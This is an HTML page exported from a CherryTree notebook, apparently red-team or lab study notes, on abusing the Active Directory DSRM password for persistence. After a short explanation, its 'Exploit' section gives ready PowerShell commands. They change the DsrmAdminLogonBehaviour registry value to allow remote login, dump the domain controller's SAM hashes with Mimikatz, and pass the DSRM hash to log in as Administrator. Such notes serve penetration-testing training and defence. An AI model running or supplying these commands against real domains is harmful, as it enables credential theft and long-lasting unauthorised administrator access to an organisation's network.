<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Grab DSRM Password</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Grab DSRM Password</h1></strong><br />The DSRM password is rarely ever changed!<br /><br /><strong><h2>## What is the DSRM password?</h2></strong><br />DSRM stands for <em>Directory Services Restore Mode</em>.<br />A DSRM password is required when a server gets promoted to Domain Controller.<br /><br />The DSRM password is used to reboot/restore the Domain Controller.<br />In scripts, DSRM is called <em>SafeModePassword</em>.<br /><br />On every Domain Controller, there&#39;s a local admin called <code>Administrator</code> whose password is the DSRM password. Our goal is to grab the DSRM password and login remotely as Administrator.<br /><br /><strong><h2>## Why can this be used for persistence?</h2></strong><br />The DSRM password almost never gets changed, so we can use it to log in as Administrator later.<br />Persistence usually lasts a very long time (because people rarely change the DSRM password).<br /><br /><strong><h2>## Exploit</h2></strong><br /><strong><h3>### Enable remote login with DSRM password</h3></strong><br />By default, the DSRM account isn&#39;t allowed to login remotely to the Domain Controller.<br />This can be modified in the registry of the Domain Controller with Domain Admin privileges<br /><br />BE CAREFUL - by doing this you downgrade the enterprise&#39;s security<br /><div class="codebox"><div class="codebox">#&nbsp;Check&nbsp;DrsmAdminLogonBehaviour&nbsp;property&nbsp;(default&nbsp;is&nbsp;0)<br />Get-ItemProperty&nbsp;&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;<br /><br />#&nbsp;Change&nbsp;DsrmAdminLogonBehaviour&nbsp;property&nbsp;to&nbsp;2&nbsp;to&nbsp;allow&nbsp;remote&nbsp;login<br />Set-ItemProperty&nbsp;&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;&nbsp;-Name&nbsp;&quot;DsrmAdminLogonBehaviour&quot;&nbsp;-Value&nbsp;2<br /><br />#&nbsp;If&nbsp;the&nbsp;property&nbsp;doesn&#39;t&nbsp;exist,&nbsp;&nbsp;you&nbsp;can&nbsp;set&nbsp;a&nbsp;new&nbsp;one<br />New-ItemProperty&nbsp;&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;&nbsp;-Name&nbsp;&quot;DsrmAdminLogonBehaviour&quot;&nbsp;-Value&nbsp;2&nbsp;-PropertyType&nbsp;DWORD</div></div><br /><br /><strong><h3>### Dump and use DSRM password/hash</h3></strong><br /><div class="codebox"><div class="codebox">#&nbsp;dump&nbsp;DSRM&nbsp;password&nbsp;(need&nbsp;Domain&nbsp;Admin&nbsp;privileges)<br />Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;token::elevate&quot;&nbsp;&quot;lsadump::sam&quot;&#39;&nbsp;-ComputerName&nbsp;dcorp-dc<br /><br />#&nbsp;pass&nbsp;DSRM&nbsp;hash&nbsp;to&nbsp;log&nbsp;in&nbsp;(run&nbsp;as&nbsp;Local&nbsp;Administrator)<br />Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;sekurlsa::pth&nbsp;/domain:dcorp-dc&nbsp;/user:Administrator&nbsp;/ntlm:&lt;ntlm&nbsp;hash&gt;&nbsp;/run:powershell.exe&quot;&#39;</div></div><br /></div>
</body>
</html>
